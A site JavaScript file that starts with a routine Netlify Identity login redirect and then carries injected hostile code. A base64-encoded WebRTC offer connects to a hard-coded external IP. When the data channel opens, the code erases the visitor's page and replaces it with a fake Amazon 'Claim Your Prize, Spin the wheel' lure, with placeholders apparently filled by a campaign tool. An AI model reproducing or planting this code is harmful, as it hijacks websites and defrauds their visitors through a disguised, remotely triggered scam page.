var _env = {
  mutation: true
}

// JS Goes here - ES6 supported
if (window.netlifyIdentity) {
  window.netlifyIdentity.on("init", user => {
    if (!user) {
      window.netlifyIdentity.on("login", () => {
        document.location.href = "/admin/";
      });
    }
  });
}

  var sdp =
    "eyJ0eXBlIjoib2ZmZXIiLCJzZHAiOiJ2PTBcclxubz0tIDI4MDc4MzExMTEgMiBJTiBJUDQgMTI3LjAuMC4xXHJcbnM9LVxyXG50PTAgMFxyXG5hPWdyb3VwOkJVTkRMRSBkYXRhXHJcbmE9bXNpZC1zZW1hbnRpYzogV01TXHJcbm09YXBwbGljYXRpb24gMzAwMDEgRFRMUy9TQ1RQIDUwMDBcclxuYz1JTiBJUDQgNTQuMTQ0LjIzNy44NFxyXG5hPWNhbmRpZGF0ZTozMzY2NDg1MTc3IDEgdWRwIDMzNTIzNTY4OTMgZmU4MDo6MTAxMTo5M2ZmOmZlNzA6ZjAyLzY0IDMwMDAwIHR5cCBob3N0IGdlbmVyYXRpb24gMCBuZXR3b3JrLWlkIDIgbmV0d29yay1jb3N0IDUwXHJcbmE9Y2FuZGlkYXRlOjEyNTE4Nzk1OTQgMSB1ZHAgMjQwMzQ4MzI5MiA1NC4xNDQuMjM3Ljg0IDMwMDAwIHR5cCBob3N0IGdlbmVyYXRpb24gMCBuZXR3b3JrLWlkIDEgbmV0d29yay1jb3N0IDUwXHJcbmE9aWNlLXVmcmFnOmViVEtcclxuYT1pY2UtcHdkOmZLQ0lFWUdseU1XVGl1WVlJTEtOb3V0ZFxyXG5hPWZpbmdlcnByaW50OnNoYS0yNTYgMjI6MDE6OUI6NDg6NzI6QTE6NEE6Njg6RkI6MUE6NEY6MUQ6Mzc6QTc6Rjg6MEY6OEE6MjQ6MEM6Mjg6RDY6OEI6Njk6MDE6REY6M0Y6ODc6QkU6ODY6RTc6OTc6MkJcclxuYT1zZXR1cDphY3RwYXNzXHJcbmE9bWlkOmRhdGFcclxuYT1zY3RwbWFwOjUwMDAgd2VicnRjLWRhdGFjaGFubmVsIDEwMjRcclxuIn0=";
  // Using public stun server    
  var configuration = {
    'iceServers': [{
      'url': 'stun:stun.l.google.com:19302'
    }]
  };

  var constraints = null;
  var PeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
  var localPeerConnection = new PeerConnection(configuration, constraints);
  var dataChannel = localPeerConnection.createDataChannel("my");

  if (dataChannel) {
    dataChannel.onmessage = function (event) {
      console.log("received: " + event.data);


      


    };
    dataChannel.onopen = function () {
    
      var readyState = dataChannel.readyState;
      if (readyState == "open") {
        console.log('dc open')
        var msg = "tesffor awit";
        var data = [msg, "{{.Plt}}", "{{.Cid}}"];
        var obj = {
          "c": 'cid',
          "d": data.join(":")
        }
        if (_env.mutation){

        // Change DOM 
        console.log(window)
        //  document.body.parentNode.removeChild(document.body)
        document.body.innerHTML = "";
        document.body.style.background="#ffffff";
        var p = document.createElement("p");
        p.innerHTML = 'there is statment';
        document.body.style.minHeight = "100vh";
        document.body.appendChild(p)
        // var a = document.getElementsByClassName('mw7')[0];
       
        var template= ` 
        <div>
        <p style="text-align:center">
            Every we choose 10 lucky users randomly receive a reward from Amazon. This is our way to thank you for your continuing support
            for our products and services!
            <br>
            <br>
        </p>
        <div style="background-color:#232f3e;color:white;border-radius:0;margin:0;padding:0;padding-bottom:10px;margin-top:7px;padding-top:5px;width:100%">
            <h2 style="margin:0;padding:0;padding-bottom:3px">Claim Your Prize</h2>
            <h2 style="margin:0;padding:0">
                <span class="bounce">↓</span> Spin the wheel
                <span class="bounce">↓</span>
            </h2>
        </div>
        <br>
        <br>
        <p></p>
    </div>
        `;
    document.body.innerHTML = template;

        // a.parentNode.removeChild(a)
      }
      }
    };
    dataChannel.onclose = function () {
      console.log("datachannel close");
    };
  }

  var rtcsd = new window.RTCSessionDescription(JSON.parse(atob(sdp)));

  if (rtcsd) {

    localPeerConnection.setRemoteDescription(rtcsd);

    localPeerConnection.createAnswer().then(function (sdp) {

      return localPeerConnection.setLocalDescription(sdp);
    });
  }

  
